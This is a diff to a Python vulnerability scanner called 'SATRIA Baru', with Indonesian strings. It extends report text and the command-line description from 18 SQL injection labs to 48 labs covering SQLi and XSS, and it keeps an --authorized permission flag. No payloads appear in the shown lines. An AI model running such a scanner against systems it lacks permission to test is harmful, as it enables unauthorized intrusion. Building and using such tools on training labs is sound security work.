+    page.bullet_paragraph("Bukti ditampilkan apa adanya berdasarkan temuan terverifikasi.")
     page.y -= 18
 
     # --------------------------------------------------------------- RINGKASAN
     page.new_page()
-    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 18 lab yang diminta saja.")
+    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 48 lab yang diminta.")
     rows = [
-        ("Total lab", "18", "Semua judul wajib dari katalog SATRIA Baru."),
+        ("Total lab", "48", "Semua judul wajib dari katalog (18 SQLi + 30 XSS)."),
         ("Terkonfirmasi", str(len(confirmed)), "Bukti diferensial terpenuhi dan dapat diulang."),
         ("Belum terkonfirmasi", str(len(not_confirmed)), "Tidak ada bukti cukup pada putaran ini."),
         ("Severity Critical", str(by_severity.get("critical", 0)), "Hitungan hanya untuk temuan terkonfirmasi."),
@@ -2279,7 +2470,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # ------------------------------------------------------------------- TABEL
     page.new_page()
-    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 18 lab.")
+    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 48 lab.")
     headers = ("Lab", "Status", "Fokus", "Judul", "Severity")
     widths = (82.0, 92.0, 90.0, 190.0, 45.0)
     x_cols = []
@@ -2320,7 +2511,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
         page.y -= row_h
         page.line(content_left, page.y, content_right, page.y, _PDF_COLORS["line"], 0.6)
     page.y -= 20
-    page.section_title("Detail Bukti", "Detail hanya menjabarkan apa yang benar-benar diobservasi pemindai. Bukti yang rahasia dimask.")
+    page.section_title("Detail Bukti", "Detail hanya menjabarkan apa yang benar-benar diobservasi pemindai.")
 
     # ------------------------------------------------------------------ DETAIL
     for item in labs:
@@ -2366,7 +2557,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     # --------------------------------------------------------- CATATAN AKHIR
     page.y -= 6
     page.section_title("Catatan Laporan")
-    page.bullet_paragraph("Dokumen ini hanya memuat 18 lab SQL injection yang diminta pengguna. Judul selain 18 itu tidak dimasukkan.")
+    page.bullet_paragraph("Dokumen ini memuat 48 lab (18 SQL injection dan 30 XSS) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
     page.bullet_paragraph("Status not_confirmed tidak sama dengan tidak rentan; ia hanya menyatakan bukti pemindaian tidak cukup.")
     page.bullet_paragraph("Ringkasan severity dihitung dari temuan terkonfirmasi saja, sesuai field summary yang dibaca app.py.")
     page.bullet_paragraph("Lab 16-17 memerlukan collaborator atau webhook poller. Tanpa itu, pemindai tidak mengklaim deteksi OOB.")
@@ -2377,7 +2568,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     for idx, page_ops in enumerate(page.pages, start=1):
         page_ops.append(f"{_pdf_rgb(_PDF_COLORS['navy'])} rg 0 {_pdf_num(_PDF_PAGE_H - 32)} {_pdf_num(_PDF_PAGE_W)} 32 re f")
         page_ops.append(f"BT /F2 8 Tf {_pdf_rgb(_PDF_COLORS['white'])} rg {_pdf_num(content_left)} {_pdf_num(_PDF_PAGE_H - 21)} Td (SATRIA BARU - SQL Injection Report) Tj ET")
-        page_ops.append(f"BT /F1 7.5 Tf {_pdf_rgb(_PDF_COLORS['light'])} rg {_pdf_num(360)} {_pdf_num(_PDF_PAGE_H - 21)} Td (18 Lab Pilihan) Tj ET")
+        page_ops.append(f"BT /F1 7.5 Tf {_pdf_rgb(_PDF_COLORS['light'])} rg {_pdf_num(340)} {_pdf_num(_PDF_PAGE_H - 21)} Td (48 Lab: SQLi + XSS) Tj ET")
         footer_target = _pdf_safe_text(target)
         if len(footer_target) > 84:
             footer_target = footer_target[:81] + "..."
@@ -2468,7 +2659,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
                  allow_partial_tools: bool | None = None,
                  enable_llm: bool | None = None, run_censys: bool | None = None,
                  run_nvd: bool | None = None, **runtime_options: Any) -> dict[str, Any]:
-    """Jalur kompatibel yang dipakai app.py; mengunci cakupan pada 18 lab SQLi."""
+    """Jalur kompatibel yang dipakai app.py; memindai 48 lab (18 SQLi + 30 XSS)."""
     overrides: dict[str, Any] = dict(runtime_options)
     for name, value in (("allow_partial_tools", allow_partial_tools),
                         ("enable_llm", enable_llm), ("run_censys", run_censys),
@@ -2517,7 +2708,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
 
 
 def main(argv: list[str] | None = None) -> int:
-    parser = argparse.ArgumentParser(description="SATRIA Baru — pemindai SQL injection untuk 18 lab terpilih")
+    parser = argparse.ArgumentParser(description="SATRIA Baru — pemindai SQL injection dan XSS (48 lab)")
     parser.add_argument("target", help="URL target HTTP/HTTPS (mis. URL instance lab PortSwigger)")
     parser.add_argument("--authorized", action="store_true", help="Wajib: Anda menyatakan memiliki izin pengujian.")
     parser.add_argument("--allow-private", action="store_true", help="Izinkan target localhost/private (untuk pengujian lokal).")
@@ -2552,7 +2743,7 @@ def main(argv: list[str] | None = None) -> int:
         return 1
     json_path, html_path = write_report(report, Path(args.output_dir))
     summary = report["summary"]
-    print(f"SATRIA Baru selesai: {summary['confirmed']}/18 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
+    print(f"SATRIA Baru selesai: {summary['confirmed']}/48 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
     print(f"JSON: {json_path}")
     print(f"HTML: {html_path}")
     return 0
